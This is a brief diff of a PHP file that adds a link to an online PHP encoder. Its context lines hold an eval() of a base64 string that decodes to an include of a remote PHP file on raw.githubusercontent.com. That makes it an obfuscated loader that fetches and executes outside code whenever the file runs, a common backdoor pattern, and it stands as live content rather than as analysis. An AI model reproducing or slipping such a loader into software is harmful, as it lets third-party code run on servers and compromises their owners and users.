@@ -1,3 +1,5 @@
+http://phpencoder.atwebpages.com/index.php
+
 //https://raw.githubusercontent.com/adiya99/adiyarizka/master/koneksi.php
 eval("?>".base64_decode("PD9waHANCmluY2x1ZGUgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hZGl5YTk5L2FkaXlhcml6a2EvbWFzdGVyL2tvbmVrc2kucGhwIjsNCj8+")); 
 
